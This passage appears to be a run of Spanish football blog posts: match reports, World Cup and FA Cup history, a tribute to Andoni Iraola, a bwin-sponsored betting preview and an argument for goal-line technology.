épocas no demasiado lejanas, en una competición residual. Ya ha ocurrido en otras ocasiones que el Bayern descabece a sus rivales fichando a sus mejores jugadores, pero muy pocas veces se había enfrentado a un rival tan poderoso, y también pocas veces la decapitación del mismo se ha producido de modo tan “violento” y llamativo: morterada y los dos mejores jugadores cambian de bando de la noche a la mañana. Ilústrenme si alguien conoce algún precedente reciente de esto en alguna liga mayor. Aqui sería impensable.Lo que tenemos en España es una verbena: los horarios no tienen pies ni cabeza, no hay dinero ni para pagarle a los utilleros, la copa del rey parece diseñada expresamente por un Sánchez Dragó que quiera hundirla, y el reparto de los derechos de televisión es una injusticia que indigna incluso a barcelonistas y madridistas. Pero déjenme decir que con todos sus defectos, hay una diferencia fundamental: en España compiten siempre al menos dos. Y ya puestos, prefiero el cachondeo actual de nuestro país a un torneo donde se asume como normal que todos los grandes jugadores van a acabar en un sólo equipo, como en los grandes tiempos del Steaua de Bucarest. Una liga en la que si una temporada hay pelea, hay que tener claro que la siguiente el campeón va a estar decidido en Diciembre (como este año). La liga escocesa sin el Rangers. Competición sin competición, la contradicción absoluta. España ha triturado a Venezuela (5-0) en un encuentro maravilloso en el que, después de algún tiempo, ha vuelto a acercarse al tope de su nivel de juego. El partido ha constituido una sucesión incesante de buenas noticias para la Roja, desde el nivel absolutamente estratosférico de Silva e Iniesta en el primer tiempo –gol por cabeza-, el gran rendimiento de Cesc como organizador, la actividad incansable de Jordi Alba en la banda izquierda, o el debut de Iker Muniain, que en su condición de crack en ciernes llega seguramente para quedarse muchos años. Mención aparte merece Roberto Soldado, que saliendo desde el banquillo ha tenido tiempo de firmar un hat-trick, fallar un penalty y dejar claro que si no ocurre nada extraño, uno de los dorsales de la Eurocopa debe llevar su nombre encima. Poco que destacar de Venezuela, aparte de la solvencia de Vizcarrondo y la mala suerte de Amorebieta, que jugó tocado y acabó obligado a forzar la expulsión para evitar un gol. Nada pudieron hacer los de Farías ante el vendaval ofensivo de una selección que va a viajar al Este con el título de campeona, la etiqueta de favorita y el recuerdo reciente de la barbaridad futbolística con la que nos ha deleitado hoy a todos. Casi nada. El partido perfecto que había soñado Simeone se materializó esta noche en el Nacional de Bucarest: su Atlético salió sin complejos, con empaque y personalidad, cazó pronto un golazo de Falcao –el mejor de la noche- y se preparó para un fantástico ejercicio defensivo en el que siempre cupo una mirada lejana para lanzar contragolpes. Resultó una final cruel para el Athletic, que jamás se vio cerca de la Copa, que sólo recordó pálidamente al equipazo de esta temporada en momentos aislados, y que casi sacó bandera blanca cuando Falcao descargó el segundo mazazo justo antes del descanso. El ejercicio de voluntarismo vasco se estrellaba una y otra vez frente a la telaraña colchonera, en la que destacó un imperial Mario Suárez, y el Athletic no pudo en ningún momento ni utilizar los carriles ni filtrar pases interiores; significativamente, Ander Herrera acabó desquiciado y sustituido. En el decurso del segundo tiempo, y con los de Bielsa cada vez más fatigados, el Atlético incrementó su frecuencia de contraataques, y acabó cerrando el partido en una sensacional acción individual de Diego, siempre genial cuando quiere. Así, el equipo madrileño se proclama justo campeón de una final donde no necesitó el balón para ser mucho mejor que su rival, desarrollando además un tipo de fútbol que entronca con la mejor tradición del club. El Athletic ha muerto en la orilla tras brindar grandes noches, aceptó la derrota con gran deportividad,  y el Loco deberá trabajar la cabeza de sus jugadores con vistas a la otra final que les queda. La gabarra tendrá que esperar.Los años pasan, los kilómetros se acumulan y la respuesta del cuerpo ante una competición cada vez más exigente en lo físico ya no es la de antaño. Su adiós lo decidió él mismo, del mismo modo que decidió que su estado físico (una pubalgia lo tenía seriamente mermado) no le hacía digno de entrar en aquella lista de Vicente del Bosque para la Eurocopa de 2012. Estimó que, en sus condiciones, ya no podía ofrecer al Athletic Club lo mínimo imprescindible para poder seguir formando parte de su plantilla. Siempre anteponiendo el interés del colectivo al suyo propio. Mejor decidir marcharse, por duro que pueda resultar, antes que obligar a aquel al que más quieres a señalarte la puerta de salida, a decirte que ya ha dejado de confiar en ti. Siempre pensando en plural, Andoni.Dicen que uno juega tal y como es en su vida diaria. Que el fútbol es una expresión más de la personalidad. E Iraola, íntegro, sincero y consecuente consigo mismo, es de aquellos que no saben engañar. Transparente, profesional y comprometido. Por eso prefiere dejarlo cuando muchos aún consideramos que todavía podría resultar útil al equipo, porque sólo Andoni sabe realmente cómo está Iraola y nadie mejor que él para tomar una decisión de tal calibre.[Calentando motores para Sudáfrica, comenzamos hoy una serie donde pretendemos recordar momentos curiosos o llamativos de la historia de los Mundiales. Esperamos que os guste]Comenzamos este recorrido por los momentos curiosos de los Mundiales por la única ocasión en que una selección dejó  una anotación de dos cifras en el marcador. Fue el 15 de Junio de 1982 en el Nuevo Estadio de Altabix, y la selección húngara de Nyilasi y Fazekas despedazó a El Salvador por 10-1. De nada sirvió la presencia en la selección centroamericana de un Mágico González en el mejor momento de su carrera, y el vendaval magiar del segundo tiempo (siete goles) dio lugar a un resultado escandaloso que “infligió una gran herida al fútbol salvadoreño”, según el propio Mágico, y que marcó en particular la carrera del arquero Guevara Mora. Curiosamente, la goleada no sirvió de nada a los magiares, eliminados tras caer ante Argentina y empatar con Bélgica. Llega esta tarde el Mallorca al Camp Nou (20,00 h., Canal+ Liga, Gol TV) aunque desde el punto de vista mediático igualmente podría venir un equipo de la Luna que no nos hubiéramos enterado. La necesidad de “noticias” es tan inmensa, come tanta gente del circo y el pobre público es capaz de aguantar tanta carnaza, que lo anecdótico asciende al rango de fundamental, y acontecimientos que en mejores tiempos hubieran merecido poco más que un recuadro en la página siete del periódico copan hoy titulares, portadas, y debates de barra de bar, televisados o no. Ojo que en todas partes cuecen habas, véase el “partidazo” de Sahin a tipo de letra 72 en Marca.El primer asunto que genera litros de saliva, especialmente en la capital, es si el fútbol del Barcelona ha pasado a ser aburrido. Sí, no importa que el Barça haya triturado 5-0 a un Villarreal que aún no había comenzado a descomponerse, aplicado el mismo correctivo a un Atleti que era la sensación del campeonato –y que enfiló después la Diagonal en medio del valle de lágrimas- o endosado a Osasuna un 8-0, no hay resultado que hable más por sí mismo. Estamos hablando de partidos de los últimos dos meses, no de la época de la camisetas con cuerdas o los árbitros con gorra. Llámenme anticuado, pero servidor tiende a pensar que pocas cosas en el fútbol aburren menos que una ametralladora de goles, y pocos partidos como estos admiten mejor el disfrute de una redifusión: tanto desde el punto de vista táctico como estético.Pero es que el Barça lleva tres partidos con un juego ramplón y horizontal, mientras que el Real Madrid es ahora una sinfonía, se oye por ahí, en ese patio de Monipodio en el que se ha transformado el análisis futbolero. De acuerdo, analícese. Partido contra el Viktoria: el encuentro estándar jugado en competición europea desde tiempo inmemorial del grande contra el pequeño, que todos sabemos que va a ganar el Barça, salvo error u omisión, desde que el Platini de turno saca la bolita. Los checos lo hacen lo mejor que pueden, las estrellas azulgrana juegan el partido como un funcionario hace fotocopias 2-0 y a las once de la noche no recuerda el partido nadie. Contra el Sevilla: el “juego ramplón” produce una tormenta en el área que canoniza a Javi Varas en 90 minutos. Y frente al Granada, el Barcelona anota pronto de libre directo –sí, también vale- para agarrarse al juego de posesión y sí, quizá aburrir un poco. Un rato, un campo pequeño, un partido entre semana. Y además… ¿cuántos equipos son capaces de asegurar la victoria a través de tal monopolización de la bola?Esto va de ganar, y de probabilidades de ganar, y hablamos de una larga Liga.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Las discusiones llegan a su máximo punto de surrealismo cuando se critica a Messi por su actuación en estos tres partidos. Como siempre, uno puede agarrarse a la coherencia, representada en Guardiola, que nos cuenta a los profanos como funciona el asunto: “Messi seguiría siendo vital aunque no marcase ni un gol más.” Además del voto de confianza a su jugador estrella, Pep recuerda lateralmente que Messi no sólo es el trueno goleador de esta época, sino también un fenomenal asistente, y un pelotero heterodoxo que cuando toca no vacila en recordar viejos tiempos y ejercer de Eraser de contrarios recordando todas las virtudes del extremo. Leo es la superioridad del Barça en los partidos trabados a través de sus cientos de posibilidades, y negarle el pan y la sal por tres partidos sin marcar –en los cuales, por cierto, falló un penalty y le sacaron un balón bajo los palos- suena mucho más a ataque interesado y a deseo fanático que a un análisis desapasionado de su aportación. Más interesante sería hablar de si al final vuelve Piqué tras su lesión, pues el juego del Barcelona depende más de él de lo que parece.En realidad, poco invita a pensar que Messi no marque hoy, el Barça no prosiga con su racha inmaculada –ni una vez ha recogido Valdés la bola en la red local- o el Mallorca iguale la gesta del año pasado. Si alguna chance aguarda a los bermellones debe proceder de un inmaculado trabajo en la zaga y una interpretación solidaria y correcta del sistema de ayudas, coberturas y basculaciones, y ahí nos sumergimos de lleno en el terreno Caparrós. Los equipos que entrena el utrerano saben sufrir ante rivales superiores, y ya salieron los isleños bastante indemnes de la difícil plaza del Manzanares y el choque contra el efervescente Valencia; otra cosa son esos partidos en que la dinàmica te exija algo de creatividad, véase el partido contra el Sporting. En cualquier caso, la duda razonable será hasta donde podrán aguantar los mallorquines el 0-0, o incluso un resultado corto. Y hay también ganas de ver al Chori, a quien muchos esperamos desde hace tiempo -Laudrup lo apartó del equipo- con este nuevo Mallorca y en un gran escenario. En condiciones ideales, debería ser la punta de lanza de este pretendido grupo de gladiadores.Es posible que los primeros minutos determinen mucho el transcurso del partido. En bwin.com dan 8.25 por 6 goles en total, 14 por 7 goles y 17.50 por ocho o más goles, así que si el Barça marca pronto esta opción puede convertirse en ganadora. A la inversa, si confiamos en las virtudes defensivas de los bermellones o creemos que al fin y al cabo es cierto que el Barça está en momento bajo, las apuestas por un empate visitante se pagan a 10.50, el 0-0 a 34, y exactamente un gol de alguno de los dos también a 10.50. Finalmente, no olvidemos el carácter competitivo de Messi; si la cosa se le da medio decentemente, que abra el marcador da 2.75, que lo cierre también, que haga doblete 2.70 y el hat-trick 7. Y ojo, dos goles o más de Fàbregas, también a 7. Nada descabellado en un jugador que saldrá a comerse el césped después de su lesión. Un Madrid pobre de solemnidad y paupérrimo por momentos –especialmente en el primer tiempo- ha sudado de lo lindo la mínima ante un Mallorca tan serio en defensa como desafortunado en sus llegadas al balcón de Casillas, escasas pero diáfanas. Mourinho envidó de primeras con Kaká y Gago en lugar de Xabi y Özil, y el equipo blanco naufragó, huérfano de trazo y quite, en un primer acto donde los más destacado fue el sufrimiento de Marcelo en la izquierda y un buen disparo de Nsué que se encontró con el poste. Realizados los cambios pertinentes en el ecuador y por fin con centrocampistas que son presente y no pasado, el Real Madrid se adueñó de la cadencia del juego, y empezó a jugar con más frecuencia en las proximidades del seguro Aouate. Sin alardes, por tanto, los locales comenzaron a rondar un gol que acabó concretando el discutido Benzema en una buena maniobra de delantero centro; luego erraría otra aún más clara para avivar el debate. El resto quedó para algún contragolpe y ataques algo deslavazados del Mallorca, excepto una eléctrica jugada final que estrelló Webó en Casillas. Un partido del que sale más reforzado el equipo isleño que el madrileño, que puso de manifiesto un problema mucho más grave que el tan cacareado nueve: la ausencia de centrocampistas de categoría, Xabi Alonso aparte. Pocos de los que vimos aquel partido hemos conseguido olvidarlo. Por primera vez, una selección africana, Camerún, llegaba a cuartos de final del Mundial, y se encontraba en Nápoles con una maravillosa versión de Inglaterra. Los leones indomables, cuyo icono mas visible era el anciano Roger Milla, realizaron una exhibición de fútbol de ataque, remontaron el tanto inicial de David Platt y, ya con el 2-1, se dedicaron a divertirse y divertir en una marea de taconazos, virguerías y malabarismos. Luego ya se impuso la dura realidad del fútbol competitivo, pero en el recuerdo emotivo quedan esos momentos irrepetibles en que muchos nos pusimos mentalmente la camiseta verde y disfrutamos hasta de esa vuelta de honor que, derrotados pero felices, dieron los cameruneses a petición del público. Rara vez fue más merecida. Una resaca tan poderosa de polémicas arbitrales nos da pie para traer a colación el famoso Brasil-Rusia del 82 en Nervión. La canarinha presentaba el equipazo de los Sócrates, Falcao y compañía, pero no se quedaban atrás Blokhin, Demianenko, Baltacha o el mítico Dasaev. Los europeos se adelantaron en la primera tras un error del guardameta Peres, pero Brasil levantó el partido con una grandiosa exhibición en el segundo tiempo que incluyó golazos de Sócrates y el cañonero Eder. Sin embargo, el encuentro se recuerda sobre todo por la actuación del colegiado español Lamo Castillo, que anuló un tanto más que dudoso al ruso Shengelia, y no pitó dos presuntos penaltis en el área brasileira, resultando bastante escandalosas en particular las manos de Luizinho. Un partido que lo tuvo todo. Hablamos de él hace unas semanas a cuenta de su penoso estado actual, pero lo cierto es que muchos nos sorprendimos –e incluso llegamos a conmovernos- cuando vimos a Gazza, aquella tarde de Junio en el frío Delle Alpi de Turín, derramar lágrimas que contenían tanta desesperación como pena: el árbitro Joel Quiniou acaba de amonestarlo, y eso significaba que ocurriese lo que ocurriese al término del partido, no podría comparecer para enfrentar a Argentina en la final.Exactamente como lo habría hecho el Señor Lobo. Espero que sepan disculparme por sacar a primera plana la antigualla que está criando polvo en el rincón de la vitrina pero me apetece darles un poco la murga con la Copa. Como Carpanta, el famoso vagabundo hambriento creado por Escobar para ilustrar las calamidades de la España de posguerra, la mayoría futbolera patria vamos a tener que tragar un año más con esta Copa que es poco menos que una raspita de sardina que llevarse a la boca. Cuando tenía hambre Carpanta soñaba pollos, nosotros con la FA Cup. Si su bufanda es de un equipo modesto porque el propio sistema de competición te corta las alas y si por el contrario está tejida con los colores de un grande porque simplemente le importa un carajo, lo cierto es que la Copa del Rey se ha convertido en un fantasma en medio de la temporada.Y ahora que cada uno que coja su parte de este pastel. Insípido pastel por cierto. Se critica mucho a la Real Federación Española por el constante e inexplicable mangoneo que hace de una competición que debería ser mimada al extremo, pero los que firman y acatan el mecanismo son los propios clubes. Y ahí, tanto los grandes y los pequeños, que lógicamente no quieren renunciar al caramelo de los ingresos extra, son igual de responsables del desaguisado que la RFEF. Hablo del tan reclamado partido único. ¿No es que es miserable no atreverse a jugar a partido único por miedo a que te pinte la cara un segunda b o se te lesione el astro de turno? . ¿No lo es igualmente mutilar lo que podría ser una competición preciosa castigando a los clubes de base? Señores, todo a partido único ya.Decía Woody Allen que si tenía que escoger en que invertir su tiempo de ocio prefería los deportes, practicante asiduo como fue en sus años mozos y ahora desde la butaca, al teatro, el cine o cualquier otro espectáculo porque un partido era siempre imprevisible. No conocía el fútbol español. El 27 de septiembre juegan Real Madrid, Sevilla, Valencia, Barcelona, Villareal, Atlético, Getafe, Espanyol, Zaragoza, Levante, Racing, Athletic, Osasuna, Deportivo, Real Sociedad, Almería, Hércules, Málaga, Mallorca y Sporting. Veo a 20 equipos de Primera descansaditos en dieciseisavos, reflexiono sobre lo que pensaba el gafitas, y me apetece irme al cine. Acercarse a Wembley el 5 de Mayo del 73 obligaba a embarrarse los zapatos. No era un clima normal para una final de Copa pero fue perfecto para la más anómala de todas. Aquel cuento irrepetible lo escribieron, mano a mano, el Leeds United y el Sunderland. El vigente campeón y un equipo de segunda. Don Revie, traje de sastre impecable, y Bob Stokoe, chándal rojo de los pies a la cabeza. La apisonadora contra el infrafútbol. Billy Bremmer, Norman Hunter, Johnny Giles o Peter Lorimer contra nadie. Es conocido que el Sunderland supo protagonizar la mayor sorpresa en la historia del rorneo pero la miga de aquella, como casi siempre, se ecuentra por el camino.Bob Stokoe y Don Revie. Hoy he desayunado café y un par de cromos legendarios gracias al buen trabajo de la página del  Sunderland en Facebook. Me encanta en particular la que muestra a Bob Stokoe abrazando a Jim Montgomery con la copa ya en la mochila. Dos adultos muy feos estrujándose las costillas bajo la lluvia, si esa fotografía no es la definición de la felicidad del outsider se le acerca bastante. La contradicción Mourinho/Guardiola es basura comparada con lo que representaban Stokoe y Revie. Enemigos en lo deportivo, Stokoe le había levantado una Copa al Manchester City de Revie con el Newcastle, no podían estar más alejados en lo personal. Revie intentó convencer a Stokoe para dejarse perder durante sus primeros años como entrenador y este rechazó la oferta con dignidad. Uno había nacido para dominar, el otro para dar tumbos en los banquillos de madera vieja del Bury, del Charlton o de cualquier otra medianía sin más equipaje que su fama de entrenador duro. Hace seis meses había salvado al Sunderland de hundirse en tercera, ahora besaba la Copa. Era el chándal sometiendo al traje.Jim Montgomery. Su doble parada a Cherry y Lorimer en la final es un icono indeleble en el imaginario colectivo del fútbol británico. La imagen de aquella final. La mejor estirada que jamás hayan visto las torres gemelas de Wembley hay que anotársela al rizoso del Sunderland. “Entrenaba para hacer paradas como esa, solo se trata de levantarte sin usar las manos”, añadió Montgomery con naturalidad al término del encuentro, mientras muchos todavía seguían creyendo que aquella pelota había entrado. Seguramente fue uno de los porteros más talentosos de su generación.Ian Potterfield. One hit wonder. En diez años con la camiseta rojiblanca anotó unos discretos diecisiete tantos pero decidió poner a trabajar la bota en el instante más importante de la historia del club. A la media hora de arrancar el envite Potterfield paso de operario a héroe. El balón apareció despistado por el punto de penalti, rebotado y sucio de trayectoria, para que Potterfield lo hiciera bueno con su pierna mala. “Fue la primera vez en mi vida que me emocioné. No soy un tío emotivo pero se me saltaban las lágrimas”Concepto sunderland. Montgomery, Malone, Guthrie, Horswill, Wattson, Pitt, Kerr, Hughes, Halom, Potterfield, Tueart, Young y Bob Stokoe.Para la historia quedaron una grandiosa semifinal, el encuentro entre los alemanes luego campeones y la última gran generación inglesa, los goles de Brehme y Platt y el drama final de los penaltis con Waddle de villano. Sin embargo, la imagen de ese partido, la que siempre acude a la memoria veinte años después, es la de éste genial desequilibrado que demostró aquel día, sin pretenderlo y mucho menos sin desearlo, cuánto amaba el fútbol. Hubo un tiempo en el que yo pensaba igual que mi compañero Galder en el asunto de la tecnología en el fútbol, aunque no por las mismas razones que él. A mí nunca me han gustado las artimañas, el juego subterráneo ni el otro fútbol. Soy de los que se identifican con los ingleses cuando abroncan al que finge, y de los que creen que a un chapuzón flagrante para engañar al árbitro debe seguir una buena sanción que le quite al Luis Suárez de turno las ganas de volver a hacerlo. Por lo mismo, me parece que no saben igual los partidos o campeonatos ganados limpiamente que los obtenidos por ayudas o errores arbitrales, y aunque no me vaya nada en el envite, siento una profunda desazón cuando pienso en jugadas como la mano de Dios o el gol de Hurst. Ayer mismo escuchaba varias referencias a Italia como “el equipo de las cuatro estrellas”, y me gustaría conocer cuántos de los que oían la frase saben cómo se conquistó la primera de ellas. Muchas veces el tiempo oculta la falta y sólo el resultado pervive. Aunque estuviera Mussolini metido en el ajo.Del mismo modo, tampoco compro el argumento de que hay que dejar que decida el árbitro porque así el fútbol se parece más a la vida, y así se hablará de estas jugadas hasta el fin de los tiempos. Puede ser que así sea, pero siguiendo el símil, pienso que la prohibición de la tecnología permite que nuestro deporte se parezca a lo cotidiano en algo sumamente indeseable, como es la facilidad para la injusticia y un hueco mayor para la impunidad de los culpables. Por tanto, en este contexto, la tecnología sería un método para evitar los fallos arbitrales y todas las consecuencias indeseables o gratuitas que de ellos se derivan. Y sobre los debates posteriores, ahora mismo acabo de retwittear una noticia de Menéame en la que se explicaba como unos guardias civiles, en el colmo de la arbitrariedad, habían multado a unos chavales en la playa por. . ¡beber agua! El hecho resulta tan vergonzoso que todo el mundo habla de ello, pero ¿no sería más deseable que no hubiera ocurrido y que las discusiones posteriores, con todo lo divertidas que puedan ser, no hubieran tenido lugar?No. Mi aversión inicial a la tecnología provenía de otras fuentes. Por una parte, pensaba que parar el partido para tomar la decisión iba contra el espíritu mayormente “continuo” del tiempo en el reglamento del fútbol. Y sobre todo, porque confiando en la honradez de los árbitros, clamaba que los errores arbitrales deberían asumirse con la misma naturalidad con la que se asumen los fallos de los jugadores. Igual que siempre creemos que los futbolistas de nuestro equipo darían un brazo por marcar un gol en el partido decisivo -en unas ocasiones será cierto, en otras no-, el aficionado medio siempre está dispuesto a creer que el árbitro nunca se equivoca de buena fe, sino que todo tipo de intereses espurios, sobornos o conspiraciones judeo-masónicas llevan a haga lo posible para que venza el equipo contrario al nuestro. Yo me rebelaba, con toda mi inocencia, contra estos juicios a priori.Sin embargo, según fui creciendo y viendo más y más fútbol, mi creencia en la imparcialidad de los árbitros se fue debilitando, hasta que llegó el punto de rotura: el Moggigate. Después de informarme  y comprobar que en una gran liga europea, durante años y años, se había montado una red que había corrompido a docenas de árbitros, y que por tanto se habían tomado centenares de decisiones parciales, a conciencia, para favorecer a alguien, mi fe en la limpieza del fútbol se desmoronó. A partir de entonces, no me sorprenden en absoluto las noticias sobre apostadores que compran árbitros, presidentes que se jactan de lo mismo –incluso aquí en España– o que incluso se tome como normal que el famoso árbitro japonés lleve en volandas a un Brasil que no podía no ganar el partido inaugural. Así, ahora considero a los árbitros un mal necesario, y creo que la única manera de devolverle la credibilidad al juego es objetivar el arbitraje todo lo posible. Por tanto, no puedo por menos de alegrarme de que se introduzca con toda normalidad el ojo de halcón, y considerarlo poco más que un primer paso en lo que debe ser la evolución de la toma de decisiones en fútbol.Hablar del primer equipo en ganar la Copa sin un solo internacional a sueldo es hacerlo en palabras mayores. “El más romántico de los resultados fue la recompensa para el más prosaico sentido común”, tituló el ‘Observer’. “Bob Stokoe ha inculcado a sus jugadores su enfoque sensato del juego. Cuando habla hay sencillez, realismo y una confianza en todo lo que dice y ese es el estilo de su equipo”. Once paladines del infrafútbol, cansados y manchados de barro, que desafiaron todos los pronósticos, todas las predicciones y todas las convenciones. Que jugaron y ganaron hace 38 años. Este texto está extraído del libro ‘Un derbi solidario 2’, en el que 50 periodistas  aportamos 50 relatos sobre el Real Oviedo y el Sporting de GijónDesde que se inventaron las listas de éxitos como herramienta de marketing existe el concepto ‘one hit wonder’. Artistas que llegaron, besaron el santo y desaparecieron dejando como único legado el eco de un petardazo. El arquetipo lo han ido dibujando desde el inicio una legión de nulidades musicales pero ojo, no hablamos aquí solo de necios iluminados por la casualidad. Maravillas de un solo día las parieron también genios que merecieron mejor suerte. Así recuerdo yo la época del Tito Pompei en el Oviedo. El argentino fue un hitazo que el fútbol acabó difuminando en fade out demasiado pronto. Terminaba octubre del 97 y en la radio atronaban los Hanson pero en el Tartiere nos entregábamos a la musicalidad de una zurda impagable. No me cuesta ponerle banda sonora a algunos recuerdos.Los golazos al Mérida y al ZaragozaSi la carrera de los EMF puede resumirse el riff irresistible que hizo de ‘Unbelievable’ uno de los mayores éxitos de un solo día de la historia de la música, lo mismo puede decirse de la del Tito en camiseta azul con sus dos primeros partidos. Ahí se arremangó, empuñó la guitarra y cascó un estribillo para la eternidad. Recuerdo que cuando Pompei debutó contra el Mérida hubo que tomar medidas. Después de aquel partido decidimos, mis colegas y yo, que aquel argentino todo pecho palomo y zurda necesitaba rápidamente otro apodo. Lo del Tito lo traía de fábrica y molaba pero no bastaba, no después de aquel golazo. Le comenzamos a llamar “la crema” y así quedó hasta que tres años después desapareciera sin dejar rastro. Roberto Fabián el Tito la Crema Pompei; más largo que un trote suya por la banda pero ajustado a la dimensión de su talento. Lo que pasó aquel día lo contó con una gracia rara en él José Manuel Rad, en el resumen de TVE. Al borde del descanso se juntó la Estepa con la Pampa, comentó Rad.De modo natural, el siguiente paso debería ser el fuera de juego, donde cabe un poco de interpretación, pero en el que la mayor parte del sustrato decisivo tiene que ver con que una línea recta deje a futbolistas a un lado o a otro de ella. Y en un futuro un poco más lejano, seguramente se implementará un sistema para, si no ya objetivar porque es imposible, introducir las imágenes de televisión en la decisión sobre los penaltis y las expulsiones, que son el otro tipo de jugadas que pueden romper un partido. Aquí, al contrario que en  el caso del balón que entra o no entra, es imposible eliminar el error, pero sí reducirlo muchísimo en porcentaje. Del rugby hemos aprendido que por esperar unos segundos a que se repase una jugada no pasa absolutamente nada, y los beneficios son enormes. El fútbol es un deporte de naturaleza esencialmente discreta; o sea, que lo importante de un partido se concentra en un puñado de instantes muy concretos. Alguna vez hemos hablado de las consecuencias positivas de esto (facilidad para resumir un partido, instantes irrepetibles, opciones para el equipo menos poderoso), pero dicha naturaleza también da lugar a que el poder de un árbitro para influir o modificar el resultado de un partido sea enorme. Por tanto, para velar por la limpieza de los campeonatos y dificultar en lo más posible la corrupción y los amaños, que son posiblemente el enemigo más poderoso de nuestro deporte, la única vía es la que lleva a la eliminación o disminución drástica de la posibilidad de error arbitral. Y el ojo de halcón es el inicio del camino. El Real Madrid ha liquidado de forma administrativa su compromiso frente al Español con un 3-0 a todas luces exagerado en el que nadie hubiera creído en el minuto 75. Un encuentro extraño, falto de ritmo, jugado con pesadez por un Madrid poco motivado y menos brillante que sólo en ratos muy contados ha mostrado la electricidad característica de los equipos de Mourinho. Desequilibrado el marcador de penalty por un Cristiano que ha roto su sequía y se ha mostrado más participativo que de ordinario, un Español que nunca ha sabido muy bien si ser toro o torero vivió sus mejores minutos en la reacción subsiguiente, justo hasta que las expulsiones sucesivas de Pepe y Galán rompieron el ritmo del partido y lo convirtieron en una nada de la que han sacado provecho Higuaín y Benzema –éste con una brillante maniobra- para redondear el resultado. Atmósfera muy cargada en el Bernabéu, inexplicable para las alturas de temporada a la que estamos y muy dañina para el equipo local, tres puntos que dan tranquilidad al Madrid y un montón de incógnitas por resolver sobre el juego de los blancos con las que gozarán los próximos días los intocables gurús del tiki-taka. Vamos a divertirnos esta temporada. Salvo catástrofe, el Valencia acaba de firmar el pase a octavos de final de la Champions, una ronda que no pisa desde hace varios años. Lo ha hecho en un choque en el que ha crecido con el paso del tiempo, desde una inseguridad inicial en que ha pesado seguramente el ambiente de un Mestalla huraño y desangelado, hasta una eufórica media hora final donde ha triturado a un Rangers que ha seguido el camino inverso. El aldabonazo de salida del partido lo ha dado Naismith, con un eslalom vertiginoso y sucesivo disparo a la madera, y los protestantes han controlado bien el partido hasta que Soldado ha desequilibrado tras un córner, en un disparo de rematador puro. El Valencia ha comenzado a crecer a partir de la calma de Banega y la electricidad de Mata, indetectable para los zagueros caledonios, y ha acabado desbordando a su rival en la segunda mitad, sobre todo a partir de que Soldado consumase su doblete. La última media hora, con espacios, ha brillado un redivivo Joaquín, y el partido ha muerto tras el gran gol postrero de Tino Costa. Un 3-0 que, dado el momento de dudas que atravesaba el club ché, multiplica su importancia. Pequeña apoteosis. El Victoria Pilsen-CSKA parecía a priori el patito feo de la jornada, una mandanga, simple entretenimiento para parabólicos recalcitrantes. Pero mientras los grandes (a excepción de la Juve) dejaban transcurrir la jornada sin pausa ni prisa, se vivía en Rel Struncovich la clase de drama que al final es el que acaba llevando chavales al fútbol. Bendita norma de la UEFA que abrió hueco a los clubes más pequeños para que también tuviesen algo por lo que luchar. Resultó todo medio canónico medio heroico: primero el tanto del equipo superior, luego el empate, la expulsión, la agonía, y el golazo de Wagner lindando el descuento para dar lugar a la gran explosión de la parroquia. Si el corazón nos vibró ayer fue por estos chavales checos con nombre de cerveza.Drama bajo la nieve. Servidor visitó Estambul un Agosto, y además de asombrarse con la mezquita azul y demás, contemplar el paisaje inigualable de las fortalezas Europa y Asia a cada lado del Bósforo y ponerse convenientemente tibio de ayran y (algo menos de) raki, experimentó calores jamás sufridos ni en el famoso verano sureño español. Por eso chocaba la rabia con la que los copos herían anoche el verde del estadio, y no extrañaba la impericia casi cómica de los operarios turcos en arreglar o paliar un desaguisado que parecía de otro tiempo y lugar. Hoy, convertida la taiga en simple y prosaico patatal, Sneijder ha finiquitado la reválida europea de una pobre Juve que perdió el tren varios partidos atrás. Es un castigo, pero también una pena no poder disfrutar más adelante de bestias como Pogba o Vidal. Al amigo Conte le va corriendo el reloj.Livin’ on the edge. No está de mal recordar de vez en cuando el libro de Job. En él, nos presentan a un tipo al que es imposible que le vaya mejor el asunto: está casado con una mujer adorable, la familia le quiere, los negocios le van bien y encima anda forrado y sonriente por la vida. Así andaba ayer el Olympiakos de Míchel, jugando mejor que el Anderlecht, ganando y recibiendo penaltis y expulsiones del rival (Stark the punisher mediante) como el que ve caer copos de nieve en una tarde de Estambul. Sin embargo, conforme Proto iba deteniendo penas máximas una tras otra, el tiempo pasaba y la mínima no se movía del marcador, más cercano parecía que el único desenlace posible era el del standard bíblico: la catástrofe. No ocurrió, pero hubiera resultado muy interesante ver si Míchel hubiera sido capaz de mostrar en rueda de prensa la paciencia de aquel viejo israelita. Más bien se lo hubiera imaginado uno con un kalashnikov en la puerta de los vestuarios. El escribano y el borrón. Todos conocemos a esos tipos que en las fiestas o en los bares entran como ciclones, bebiendo copas de dos o en dos, contando chistes de tres en tres y pareciendo, durante un rato, más grandes que la misma vida. Los hemos visto entrar y los hemos visto salir, una hora después, con los ojos cerrados, el vómito presto y los pies por delante, mientras los demás casi ni hemos comenzamos la noche. Algo de eso tuvo el Bayern de Guardiola ayer, con el partido casi resuelto a los diez minutos, encaje de bolillos y presión como un solo hombre casi en el pescuezo de Hart. Hasta el último rincón de twitter olisqueaba la goleada, olvidando que a un equipo con la plantilla citizen jamás se le puede dar por muerto. El 2-3 recuerda en Munich, como aquel esclavo del emperador, que el mejor equipo del mundo también es humano. Ya lo decía Julio Iglesias. El Atlético ha olvidado no sólo ganar al Madrid, sino ser mínimamente competitivo en los derbis. Un arreón inicial del Real, que por otra parte todo el mundo esperaba; 2-0 a los veinte minutos (fe infinita de Carvalho en el primer gol, error grave de De Gea en el segundo), y no es hasta ese momento cuando el Atlético comienza a competir. Luego sí, todo lo que ha dicho Quique en rueda de prensa: seriedad, control del balón, minimización de las virtudes del rival, y ocasiones aisladas, alguna muy clara como el palo de un Forlán que, dicho sea de paso, se halla inexplicablemente en el ojo del huracán. Pero para entonces, el Madrid ya se había pertrechado atrás, había hecho descender el ritmo del partido y lo había desprovisto de ese vértigo que siempre hace falta cuando se intentan remontadas. Nada nuevo en los equipos de Mourinho, que ha fundamentado sus números tanto en victorias por aplastamiento como en encuentros como el de hoy, de cocción lenta, que exigen sobre todo madurez a sus futbolistas. Una virtud imprescindible que, por ejemplo, faltó al Madrid en Milán, pero que hoy le ha bastado para llevar el enésimo derby a buen puerto, y para conservar la imbatibilidad. No es poco. Desde que ha empezado la temporada, corren ríos de tinta sobre el canon que pretende cobrar la LFP a las diferentes emisoras de radio para que puedan retransmitir los diferentes partidos en cada jornada de Liga. De todos es sabido que desde principios de temporada todos los clubes 